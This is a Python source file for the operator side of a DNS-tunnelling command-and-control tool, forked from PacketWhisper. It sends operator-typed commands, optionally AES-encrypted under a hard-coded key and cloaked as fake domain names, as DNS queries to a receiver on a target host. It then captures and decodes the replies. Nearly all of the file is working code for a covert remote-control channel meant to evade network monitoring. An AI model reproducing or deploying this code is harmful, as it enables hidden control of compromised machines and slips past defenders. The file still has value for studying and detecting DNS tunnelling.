import subprocess
import os
import argparse
from decloakify import Decloakify
from aes_encrypt import decrypt_message, encrypt_message
from cloakify import Cloakify
from packetWhisper import ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries, TransferCloakedFile
from dns_server import start_udp_server
from scapy.all import *
import signal

def clear_files_on_exit(signum, frame):
    open('cloaked.payload', 'w').close()
    open('cloaked_response.txt', 'w').close()
    print("Files cleared on exit.")
    exit(0)

signal.signal(signal.SIGINT, clear_files_on_exit)


# AES Key
key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
cipher = "ciphers\\common_fqdn\\topWebsites"
command = None

def send_command(command, dns='localhost', args=None):
    encrypted_command = encrypt_message(command, key) if args is not None and args.encrypt else command
    cloaked_command = "cloaked_command.txt"
    
    Cloakify(encrypted_command, cipher, cloaked_command)

    TransferCloakedFile("cloaked_command.txt", 0.0, dns)
    if not os.path.exists(cloaked_command):
        print("Error: file `cloaked_command.txt` not created. (Please check permissions)")
        return
    
    fqdn_array = []
    with open(cloaked_command, 'r') as file:
        fqdn_array = [line.strip() for line in file]


    # Send command using dns requests, the checksum is the index of the fqdn in the array so that the receiver can check if any packets are missing
    
    with open(cloaked_command, 'r') as file:
        for fqdn in file:
            fqdn_str = fqdn.strip()
            id = int(fqdn_array.index(fqdn_str))
            dns_req = IP(dst=dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(unicastresponse=1, qname=fqdn_str))
            dns_req[DNS].id = id
            send(dns_req, verbose=0)


    # Remove command file
    #os.remove(cloaked_command)


def receive_response(dns='localhost', local=False, args=None):
    cloakedFile = "cloaked.payload"
    if local:
        subprocess.call(['python', 'pcapCapture.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
        dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_response.pcap", osStr="Windows")
        cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )

    cloaked_response = cloakedFile 
    
    decloaked_response = "decloaked_response.txt"
    
    with open(cloaked_response, 'r') as file:
        if file.read().strip() == "":
            print("No response received.")
            return
        
    # Decloakify the command
    if Decloakify(cloaked_response, cipher, decloaked_response) == -1:
        print("Requesting re-trasmission")
        send_command('�', dns)
        receive_response()

    # Decrypt the command
    with open(decloaked_response, 'r') as file:
        encrypted_response = file.read().strip()
    response = decrypt_message(encrypted_response, key) if args is not None and args.encrypt else encrypted_response
    print(f'\n {response}')
    if response=='�':
        send_command(command, args=args)
    
        

    # Remove useless file after execution
    os.remove(cloaked_response)
    os.remove(decloaked_response)
    start_udp_server()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Please make sure receiver is running on target ip (-d) \r\n\nNote: if unspecified default DNS (target ip) is considered to be 'localhost'",
        formatter_class=argparse.RawTextHelpFormatter 
    )
    ascii_art = """
            I@Y                  ~$o                   o$             
          "o@@@@Bf^          ,x$@@@@@@#)`          IC@@@@@m           
        'h@@Wi>b@@@@@@Mo*$@@@@@@h-  (M@@@@@@BooW@@@@@@Q:|$@@J         
       m@@@}      ;z#@@@@@$b/`          ,na@@@@@@hf`      v@@@v       
     0@@@v                                                  b@@@[     
   t@@@Y   #@@@BJ,    <h@@@X.   @@_   j@M m@@@@@@@t @@@@@@    b@@$>   
 [B@@w     #@. i@@+ `$@Y` +M@C  @@_   f@M    p@Y    @@|        `#@@M, 
r@@$'      #@. i@@l W@j    ,@@< @@_   f@M    m@c    @@z_-<       [@@@+
 -@@k      #@@@@f   @@[     @@+ @@_   f@M    m@c    @@ammY       B@$  
  X@@C     #@. t@$  >@@-   m@h  w@w   k@x    m@c    @@{         o@@i  
   a@$.    #@.  /@W'  Z$@@@o]    r$@@@W[     m@c    @@@@@@~    l@@Q   
   j@@)                                                        b@@i   
   !@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    
   `@@#                                                       `@@o    
   ^@@*                                                       '@@*    
   >@@Z                                                        @@@    
   r@@}                                                        p@@<   
   b@$.                                                        i@@J   
  +@@k                                                          M@B   
  a@$                                                           /@@m  
 t@@Y                                                            d@@^ 
'@@B                                        <>                   >@@B 
1@@/               1@$CCw@@f  c@@@!  m@n ]@MxfOO                  m@@l
p@@I               1@#    o@( c@|$@< m@n Z@a                      ]@@t
$@@                1@#    X@d c@(.@@ m@n  (@@@o<                  !@@Y
B@@.               1@#    h@/ c@| "@@o@n     ;@@                  i@@X
0@@>               {@Wl>Q@@r  c@|  :@@@n bz;:X@*                  |@@1
i@@m               '///|-     >f^    |/   }rnf,                   B@@'
 Z@@X                                                            d@@- 
  k@@a                                                          M@@n  
   f@@@/                                                      Q@@$~   
     m@@@d;                                                _#@@$n     
       j@@@@@MdX)`                                  I/CkB@@@@B-       
          >O@@@@@@@@@B#w|                   `xbM$@@@@@@@@$c:          
                  -0oW@@@@@@@$c.      ;O@@@@@@@$Mozi                  
                         "(Q#@@@@@zw@@@@@hY]                          
                               i0@@@$v,                               
                                  x:     

    ~ Loris Simonetti a.k.a HeroS3c
    Forked from: PacketWhisper                             

    """
    
    print(ascii_art)

    parser.add_argument(
        '-d','--dns',
        type=str,
    )
    parser.add_argument('--local', action='store_true', help="If both sender and receiver are on the same LAN, use this flag to capture the pcap locally.") 
    parser.add_argument('--encrypt', action='store_true', help="Use this flag if you want to use an encrypted communication.") 
    parser.add_argument('--EOT_url', type=str, help="End of Transmission URL")
    args = parser.parse_args()
    
    
    
    print("Type a command to hijack below:")
    subprocess.Popen(['python', 'dns_server.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    while True:
        if args.EOT_url:
           os.environ['EOT_URL'] = args.EOT_url
        if args.dns:
            dns = args.dns
        command = input("> ")
        if args.dns:
            send_command(command, dns, args)
        else:\
            send_command(command)
        if args.dns:
            try:
                receive_response(dns, args.local, args) 
            except Exception as e:
                print(f'Something wrong happend during the connection: {e}')
